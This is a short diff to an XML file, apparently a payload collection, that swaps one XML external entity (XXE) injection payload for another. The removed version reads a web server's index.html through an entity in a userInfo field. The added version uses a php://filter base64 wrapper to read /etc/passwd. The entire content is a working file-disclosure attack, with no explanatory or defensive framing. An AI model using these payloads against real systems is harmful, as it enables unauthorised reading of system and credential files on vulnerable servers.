@@ -1,6 +1,4 @@
-<!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///var/www/html/index.html"> ]>
-<userInfo>
- <firstName>John</firstName>
- <lastName>&ent;</lastName>
-</userInfo>
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>
+<foo><result>&ac;</result></foo>
